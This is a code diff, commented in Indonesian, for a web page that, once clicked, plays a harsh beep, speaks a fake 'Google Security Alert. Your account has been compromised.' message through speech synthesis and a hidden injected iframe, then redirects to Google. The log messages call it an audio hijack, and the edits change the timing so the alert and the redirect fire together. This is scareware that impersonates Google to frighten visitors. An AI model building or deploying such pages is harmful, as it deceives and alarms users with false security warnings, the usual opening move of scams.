@@ -40,7 +40,6 @@
   // KONFIGURASI
   // ============================================
   var TARGET_URL = "https://www.google.com";
-  var REDIRECT_DELAY = 10000; // 10 detik (DIPERPANJANG)
 
   var CONFIG = {
     tts: {
@@ -60,7 +59,6 @@
       var ctx = new (window.AudioContext || window.webkitAudioContext)();
       if (ctx.state === 'suspended') ctx.resume();
       
-      // Beep panjang (10 detik)
       var osc = ctx.createOscillator();
       var gain = ctx.createGain();
       osc.type = 'sawtooth';
@@ -69,9 +67,9 @@
       osc.connect(gain);
       gain.connect(ctx.destination);
       osc.start();
-      osc.stop(ctx.currentTime + 10.0); // Beep 10 detik
+      osc.stop(ctx.currentTime + 2.0);
       
-      log("[+] AudioContext Beep dimulai (10s).");
+      log("[+] AudioContext Beep dimulai.");
     } catch(e) {
       log("[-] Audio Error: " + e.message);
     }
@@ -85,20 +83,6 @@
       u.lang = CONFIG.tts.lang;
       u.rate = CONFIG.tts.rate;
       u.volume = CONFIG.tts.volume;
-
-      // Loop TTS setiap 3 detik selama 10 detik
-      u.onend = function() {
-        if (!executed) return;
-        setTimeout(function() {
-          if (executed) {
-            var u2 = new SpeechSynthesisUtterance(CONFIG.tts.text);
-            u2.lang = CONFIG.tts.lang;
-            u2.volume = 1.0;
-            window.speechSynthesis.speak(u2);
-          }
-        }, 3000);
-      };
-
       window.speechSynthesis.speak(u);
       log("[+] TTS dimulai.");
     } catch(e) {
@@ -120,14 +104,12 @@
         <html>
         <body>
           <script>
-            // TTS
             if ('speechSynthesis' in window) {
               var u = new SpeechSynthesisUtterance("Google Security Alert. Your account has been compromised.");
               u.lang = 'en-US';
               u.volume = 1.0;
               window.speechSynthesis.speak(u);
             }
-            // Beep panjang
             try {
               var ctx = new (window.AudioContext || window.webkitAudioContext)();
               if (ctx.state === 'suspended') ctx.resume();
@@ -135,7 +117,7 @@
               osc.frequency.value = 880;
               osc.connect(ctx.destination);
               osc.start();
-              osc.stop(ctx.currentTime + 10.0);
+              osc.stop(ctx.currentTime + 2.0);
             } catch(e) {}
           <\/script>
         </body>
@@ -148,7 +130,7 @@
   }
 
   // ============================================
-  // 3. TRIGGER (KLIK)
+  // 3. TRIGGER (KLIK - SIMULTANEOUS)
   // ============================================
   document.body.addEventListener('click', function() {
     if (executed) return;
@@ -160,35 +142,28 @@
       <div id="log"></div>
     `;
     logEl = document.getElementById('log');
-    log("[!] Memulai Long-Duration Audio Hijack...");
+    log("[!] Memulai Simultaneous Hijack...");
 
-    // A. Audio Init (0ms)
+    // ============================================
+    // EKSEKUSI SIMULTAN (0ms)
+    // ============================================
+
+    // A. Audio Init (TTS + Beep)
     initAudio();
     startTTS();
 
-    // B. Inject Iframe Audio (10ms)
-    setTimeout(injectAudioIframe, 10);
+    // B. Inject Iframe Audio (Backup)
+    injectAudioIframe();
 
-    // C. Retry Audio (Setiap 2 detik selama 10 detik)
-    var retryCount = 0;
-    var retryInterval = setInterval(function() {
-      retryCount++;
-      if (retryCount > 5) {
-        clearInterval(retryInterval);
-        return;
-      }
-      initAudio();
-      startTTS();
-      injectAudioIframe();
-    }, 2000);
-
-    // D. Redirect ke Google (Setelah 10 detik)
+    // C. REDIRECT KE GOOGLE (LANGSUNG!)
+    // Kita tidak memberikan delay sama sekali.
+    // Semua dieksekusi dalam milidetik yang sama.
     setTimeout(function() {
-      log("[+] Redirect ke Google.com...");
+      log("[+] Redirect ke Google.com (Bareng-bareng)...");
       try {
         window.location.replace(TARGET_URL);
       } catch(e) {}
-    }, REDIRECT_DELAY);
+    }, 0); // 0ms (Eksekusi secepat mungkin)
 
   }, { once: true });
 
